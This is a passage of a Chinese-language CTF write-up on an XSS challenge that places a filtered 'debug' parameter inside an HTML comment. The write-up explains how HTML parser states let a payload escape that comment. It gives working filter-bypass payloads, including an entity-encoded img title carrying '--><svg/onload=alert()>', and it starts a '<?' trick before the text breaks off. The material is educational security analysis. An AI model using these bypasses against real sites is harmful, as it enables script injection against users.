hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pwnme&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> input = (<span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;debug&apos;</span>) || <span class="hljs-string">&apos;&apos;</span>).replace(<span class="hljs-regexp">/[\!\-\/\#\&amp;\;\%]/g</span>, <span class="hljs-string">&apos;_&apos;</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> template = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&apos;template&apos;</span>);</span></span><br><span class="line">    template.innerHTML = input;</span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">    pwnme.innerHTML = &quot;<span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &quot; + template.outerHTML + &quot; &lt;/p&gt; --&gt;</span>&quot;;</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9898;&#x76EE;&#x6E90;&#x4EE3;&#x7801;&#x5982;&#x4E0A;&#xFF0C;&#x9898;&#x76EE;&#x4EE3;&#x7801;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x9996;&#x5148;&#x5BF9;&#x7528;&#x6237;&#x4F20;&#x5165;&#x7684; debug &#x53C2;&#x6570;&#x8FDB;&#x884C;&#x5173;&#x952E;&#x5B57;&#x8FC7;&#x6EE4;&#x8F6C;&#x6362;&#xFF0C;&#x5BF9;&#x4E8E;<code>!-/#&amp;;%</code>&#x7B26;&#x53F7;&#x90FD;&#x4F1A;&#x88AB;&#x4E0B;&#x5212;&#x7EBF;&#x66FF;&#x4EE3;&#xFF0C;&#x7136;&#x540E;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; template &#x6807;&#x7B7E;&#xFF0C;&#x6807;&#x7B7E;&#x7684; HTML &#x5185;&#x5BB9;&#x4E3A;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6700;&#x540E;&#x5728;&#x4E00;&#x4E2A; div &#x4E2D;&#xFF0C;&#x628A;&#x6784;&#x5EFA;&#x597D;&#x7684; template &#x6807;&#x7B7E;&#x8F93;&#x51FA;&#x5728;&#x4E00;&#x4E2A;&#x6CE8;&#x91CA;&#x5F53;&#x4E2D;&#x3002;</p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x7684;&#x4E3B;&#x8981;&#x5F97;&#x7ED5;&#x8FC7;&#x6CE8;&#x91CA;&#x7B26;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x7531;&#x4E8E;<code>&lt;!--</code>&#x662F;&#x591A;&#x884C;&#x6CE8;&#x91CA;&#xFF0C;&#x6240;&#x4EE5;&#x6362;&#x884C;&#x7684;&#x601D;&#x8DEF;&#x6211;&#x4EEC;&#x57FA;&#x672C;&#x4E0D;&#x53EF;&#x884C;&#xFF0C;&#x5373;&#x4F7F;&#x6CA1;&#x6709;&#x628A;<code>--</code>&#x8FC7;&#x6EE4;&#xFF0C;JS&#x4E5F;&#x4F1A;&#x5728;&#x7B2C;&#x4E00;&#x6B65;<code>template.innerHTML</code>&#x5C06;&#x6211;&#x4EEC;&#x7684;<code>--&gt;</code>&#x4E2D;&#x7684;<code>&gt;</code>&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#x3002;&#x6240;&#x4EE5;&#x57FA;&#x672C;&#x4E0A;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x201C;&#x76F4;&#x63A5;&#x201C;&#x95ED;&#x5408;&#x7684;&#x601D;&#x8DEF;&#x662F;&#x884C;&#x4E0D;&#x901A;&#x7684;&#x3002;</p><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x77E5;&#x9053; HTML &#x89E3;&#x6790;&#x987A;&#x5E8F;&#xFF0C;&#x9996;&#x5148;&#x5148;&#x89E3;&#x6790; HTML &#x90E8;&#x5206;&#x4EE3;&#x7801;&#xFF0C;&#x518D;&#x7528; JS &#x89E3;&#x91CA;&#x5668; JS &#x4EE3;&#x7801;&#xFF0C;JS&#x89E3;&#x91CA;&#x5668;&#x4F1A;&#x8FB9;&#x89E3;&#x91CA;&#x8FB9;&#x6267;&#x884C;&#xFF0C;&#x5BF9;&#x4E8E; innerHTML &#x4F1A;&#x4F7F;&#x7528; HTML parser &#x89E3;&#x6790;&#x5176;&#x4E2D;&#x7684;&#x4EE3;&#x7801;&#x3002;&#x672C;&#x9898;&#x4F1A;&#x5229;&#x7528;&#x5230;&#x4E00;&#x4E9B; HTML parser &#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x5EFA;&#x8BAE;&#x914D;&#x5408; W3 &#x6587;&#x6863; <a href="https://www.w3.org/TR/html52/syntax.html" target="_blank" rel="noopener">The HTML syntax</a>&#xFF0C;&#x4E0D;&#x60F3;&#x770B;&#x82F1;&#x6587;&#x7684;&#x8BDD;&#x4E5F;&#x53EF;&#x4EE5;&#x51D1;&#x5408;&#x51D1;&#x5408;&#x770B;&#x770B;&#x672C;&#x83DC;&#x4E4B;&#x524D;&#x5199;&#x7684; <a href="https://blog.zeddyu.info/2019/03/13/Web&#x5B89;&#x5168;&#x4ECE;&#x96F6;&#x5F00;&#x59CB;-XSS-I/#Encode">&#x5173;&#x4E8E; HTML &#x7F16;&#x7801;</a> &#x7684;&#x6C34;&#x6587;&#x3002;</p><h3 id="Easy-Version"><a href="#Easy-Version" class="headerlink" title="Easy Version"></a>Easy Version</h3><p>&#x6211;&#x4EEC;&#x5148;&#x6765;&#x770B;&#x770B;&#x7B2C;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x5F53;&#x65F6;&#x7531;&#x4E8E;&#x51FA;&#x9898;&#x8005;&#x6BD4;&#x8F83;&#x758F;&#x5FFD;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x8FC7;&#x6EE4;<code>&amp;#;</code>&#xFF0C;&#x5BFC;&#x81F4;&#x4E86;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528; HTML &#x5B9E;&#x4F53;&#x7F16;&#x7801;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF0C;&#x76F4;&#x63A5;&#x95ED;&#x5408;&#x6CE8;&#x91CA;&#x8FDB;&#x800C;&#x5B9E;&#x73B0; alert &#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x5728;&#x6CA1;&#x6709;&#x8FC7;&#x6EE4;<code>&amp;#;</code>&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FD9;&#x4E48;&#x505A;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x2D;</span><span class="hljs-symbol">&amp;#x2D;</span><span class="hljs-symbol">&amp;#x3E;</span><span class="hljs-symbol">&amp;#x3C;</span><span class="hljs-symbol">&amp;#x73;</span><span class="hljs-symbol">&amp;#x76;</span><span class="hljs-symbol">&amp;#x67;</span><span class="hljs-symbol">&amp;#x2F;</span><span class="hljs-symbol">&amp;#x6F;</span><span class="hljs-symbol">&amp;#x6E;</span><span class="hljs-symbol">&amp;#x6C;</span><span class="hljs-symbol">&amp;#x6F;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x64;</span><span class="hljs-symbol">&amp;#x3D;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x6C;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x29;</span><span class="hljs-symbol">&amp;#x3E;</span>&quot;</span>&gt;</span>1</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F7F;&#x7528; HTML &#x7F16;&#x7801;&#x5C06;&#x6211;&#x4EEC;&#x7684; payload &#x8FDB;&#x884C;&#x7F16;&#x7801;&#x7ED5;&#x8FC7;</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&gt;<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>/<span class="hljs-attr">onload</span>=<span class="hljs-string">alert()</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165018.png" alt></p><p>&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x5E76;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x4F20;&#x5165; HTML &#x7F16;&#x7801;&#x7ED5;&#x8FC7;&#xFF0C;&#x5F97;&#x9700;&#x8981;&#x52A0;&#x4E00;&#x4E2A; img &#x6807;&#x7B7E;&#x5229;&#x7528;&#x5176;&#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;</p><p>&#x56E0;&#x4E3A;&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x6709;&#x4E24;&#x6B21; HTML &#x89E3;&#x7801;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x662F;<code>template.innerHTML</code>&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x662F;<code>pwnme.innerHTML</code>&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x89E3;&#x7801;&#x64CD;&#x4F5C;&#x4F1A;&#x76F4;&#x63A5;&#x628A;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x8FDB;&#x884C;&#x89E3;&#x7801;&#xFF0C;&#x5E76;&#x4E14;&#x5BF9;&#x5176;&#x4E2D;&#x7684;<code>&lt;&gt;</code>&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x7B2C;&#x4E00;&#x4E2A;&#x5F97;&#x5230;&#x7684;&#x662F;&#x5982;&#x4E0B;&#x5185;&#x5BB9;&#xFF1A;</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--<span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;lt;</span>svg/onload=alert()<span class="hljs-symbol">&amp;gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;&#x7B2C;&#x4E8C;&#x6B65;&#x6E32;&#x67D3;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x81EA;&#x7136;&#x4E0D;&#x53EF;&#x80FD;&#x95ED;&#x5408;&#x6CE8;&#x91CA;&#x4E86;&#xFF0C;&#x53EA;&#x80FD;&#x5F97;&#x5230;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &lt;template&gt;--&amp;gt;&amp;lt;svg/onload=alert()&amp;gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x5F53;&#x6211;&#x4EEC;&#x501F;&#x52A9; img &#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x7B2C;&#x4E00;&#x6B65;&#x5F97;&#x5230;&#x7684;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;--&gt;&lt;svg/onload=alert()&gt;&quot;</span>&gt;</span>1</span><br></pre></td></tr></tbody></table></figure><p></p><p>HTML parser&#x4E0D;&#x4F1A;&#x5C06; title &#x5C5E;&#x6027;&#x5185;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#xFF0C;&#x6240;&#x4EE5;&#x7B2C;&#x4E8C;&#x6B65;&#x5F53;&#x76F4;&#x63A5;&#x8F93;&#x51FA;&#x5230;&#x9875;&#x9762;&#x7684;&#x65F6;&#x5019;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &lt;template&gt;&lt;img title=&quot;--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert()&quot;</span>&gt;</span>&quot;<span class="hljs-symbol">&amp;gt;</span>1 <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> --<span class="hljs-symbol">&amp;gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7136;&#x540E;&#x5F53; HTML parser &#x89E3;&#x6790;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x65F6;&#xFF0C;&#x9996;&#x5148;&#x7531;<code>&lt;!</code>&#x7684;&#x5B58;&#x5728;&#xFF0C;&#x4F1A;&#x8FDB;&#x5165;<a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-markup-declaration-open-state" target="_blank" rel="noopener">Markup declaration open state</a>&#xFF0C;&#x4E2D;&#x95F4;&#x7684;&#x4EE3;&#x7801;<code>&lt;p&gt; DEBUG: &lt;template&gt;&lt;img title=&quot;</code>&#x4F1A;&#x8BA9; HTML parser &#x8FDB;&#x5165;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x5173;&#x4E8E; comment &#x7684;&#x72B6;&#x6001;&#xFF0C;&#x8FD9;&#x4E9B;&#x90FD;&#x65E0;&#x5173;&#x7D27;&#x8981;&#xFF0C;&#x6700;&#x540E;&#x7684;<code>--&gt;</code>&#x8BA9; HTML parser &#x8FDB;&#x5165;&#x5230;&#x4E86;<a href="https://www.w3.org/TR/html52/syntax.html#comment-end-state" target="_blank" rel="noopener">Comment End State</a>&#xFF0C;&#x6839;&#x636E; W3 &#x6587;&#x6863;&#xFF1A;</p><blockquote><p>Comment end state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+003E GREATER-THAN SIGN (&gt;)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>. Emit the comment token.</p></li></ul></blockquote><p>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x5C31;&#x8FDB;&#x5165;&#x5230;&#x4E86; <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7ED3;&#x675F;&#x4E86;&#x6CE8;&#x91CA;&#x89E3;&#x6790;&#x72B6;&#x6001;&#x56DE;&#x5230;&#x4E86;&#x6700;&#x5F00;&#x59CB;&#x7684; HTML &#x89E3;&#x6790;&#x72B6;&#x6001;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x5BFC;&#x81F4;&#x6211;&#x4EEC;&#x5C31;&#x6210;&#x529F;&#x9003;&#x9038;&#x4E86;&#x6CE8;&#x91CA;&#x7B26;&#x3002;</p><h3 id="Difficult-Version"><a href="#Difficult-Version" class="headerlink" title="Difficult Version"></a>Difficult Version</h3><p>&#x518D;&#x8FC7;&#x6EE4;&#x4E86;&#x5B9E;&#x4F53;&#x7F16;&#x7801;<code>&amp;#;</code>&#x4E4B;&#x540E;&#x6211;&#x4EEC;&#x8981;&#x600E;&#x4E48;&#x7ED5;&#x8FC7;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x5148;&#x7ED9;&#x51FA;&#x4E00;&#x4E2A; Trick &#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>&lt;?</code>&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165157.png" alt></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6211;&#x4EEC;&#x5728;&#x4F7F;&#x7528;&#x4E86;<code>&lt;?</code>&#x4E4B;&#x540E;&#x6210;&#x529F;&#x628A; p &#x6807;&#x7B7E;&#x9003;&#x9038;&#x4E86;&#x51FA;&#x6765;&#xFF0C;&#x53EF;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8F93;&#x51FA;&#x7B2C;&#x4E00;&#x6B65;&#x7684;<code>template.innerHTML</code>&#x770B;&#x770B;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jn